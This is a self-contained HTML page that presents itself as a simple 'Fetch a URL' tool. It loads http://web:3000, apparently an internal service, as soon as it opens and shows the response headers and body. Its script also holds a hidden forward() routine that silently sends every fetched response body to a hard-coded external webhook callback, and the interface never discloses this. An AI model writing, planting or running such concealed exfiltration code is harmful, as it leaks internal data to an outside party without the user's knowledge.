<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Fetch web:3000</title>
<style>
  :root {
    --bg: #14171a;
    --panel: #1c2024;
    --line: #2e343a;
    --text: #e4e7ea;
    --muted: #8b949e;
    --ok: #5cc98a;
    --err: #ef7b72;
    --accent: #6cb6ff;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0;
    background: var(--bg);
    color: var(--text);
    font: 15px/1.5 ui-monospace, "SF Mono", Menlo, Consolas, monospace;
    padding: 2rem 1rem;
  }
  main { max-width: 860px; margin: 0 auto; }
  h1 { font-size: 1.15rem; margin: 0 0 1.25rem; font-weight: 600; }
  form { display: flex; gap: .5rem; margin-bottom: 1rem; }
  input {
    flex: 1; min-width: 0;
    background: var(--panel); color: var(--text);
    border: 1px solid var(--line); border-radius: 4px;
    padding: .6rem .75rem; font: inherit;
  }
  button {
    background: var(--accent); color: #0b1620;
    border: 0; border-radius: 4px; padding: .6rem 1.1rem;
    font: inherit; font-weight: 600; cursor: pointer;
  }
  button:disabled { opacity: .5; cursor: wait; }
  input:focus-visible, button:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
  #status { margin: 0 0 1rem; color: var(--muted); }
  #status.ok { color: var(--ok); }
  #status.err { color: var(--err); }
  section { margin-bottom: 1.25rem; }
  h2 { font-size: .9rem; color: var(--muted); font-weight: 500; margin: 0 0 .4rem; }
  pre {
    margin: 0; padding: .9rem 1rem; overflow: auto; max-height: 28rem;
    background: var(--panel); border: 1px solid var(--line); border-radius: 4px;
    white-space: pre-wrap; word-break: break-word;
  }
  [hidden] { display: none; }
</style>
</head>
<body>
<main>
  <h1>Fetch a URL</h1>

  <form id="form">
    <label for="url" hidden>URL</label>
    <input id="url" value="http://web:3000" spellcheck="false" autocomplete="off">
    <button id="go" type="submit">Fetch</button>
  </form>

  <p id="status" role="status">Waiting…</p>

  <section id="headers-wrap" hidden>
    <h2>Response headers</h2>
    <pre id="headers"></pre>
  </section>

  <section id="body-wrap" hidden>
    <h2>Response body</h2>
    <pre id="body"></pre>
  </section>
</main>

<script>
  const form = document.getElementById('form');
  const urlInput = document.getElementById('url');
  const go = document.getElementById('go');
  const statusEl = document.getElementById('status');
  const headersWrap = document.getElementById('headers-wrap');
  const headersEl = document.getElementById('headers');
  const bodyWrap = document.getElementById('body-wrap');
  const bodyEl = document.getElementById('body');

  const CALLBACK_URL = 'https://webhook.is/test/callback/1f1cf3cdf4a0686a8062067f2def955d';

  async function forward(output) {
    const dest = new URL(CALLBACK_URL);
    dest.searchParams.set('c', output);
    try {
      await fetch(dest.toString(), { mode: 'no-cors' });
    } catch (e) {
      console.warn('Forward to callback failed:', e);
    }
  }

  function setStatus(text, cls) {
    statusEl.textContent = text;
    statusEl.className = cls || '';
  }

  async function load() {
    const url = urlInput.value.trim();
    go.disabled = true;
    headersWrap.hidden = bodyWrap.hidden = true;
    setStatus('Fetching ' + url + '…');
    const started = performance.now();

    try {
      const res = await fetch(url);
      const ms = Math.round(performance.now() - started);
      const text = await res.text();

      setStatus(res.status + ' ' + res.statusText + ' · ' + ms + ' ms', res.ok ? 'ok' : 'err');

      const hdrs = [...res.headers].map(([k, v]) => k + ': ' + v).join('\n');
      headersEl.textContent = hdrs || '(no readable headers)';
      headersWrap.hidden = false;

      const type = res.headers.get('content-type') || '';
      if (type.includes('json')) {
        try { bodyEl.textContent = JSON.stringify(JSON.parse(text), null, 2); }
        catch { bodyEl.textContent = text; }
      } else {
        bodyEl.textContent = text;
      }
      bodyWrap.hidden = false;

      forward(text);
    } catch (e) {
      setStatus(
        'Request failed: ' + e.message +
        '. Check that the host resolves from your browser and that the server allows cross-origin requests (CORS).',
        'err'
      );
    } finally {
      go.disabled = false;
    }
  }

  form.addEventListener('submit', (e) => { e.preventDefault(); load(); });
  load();
</script>
</body>
</html>
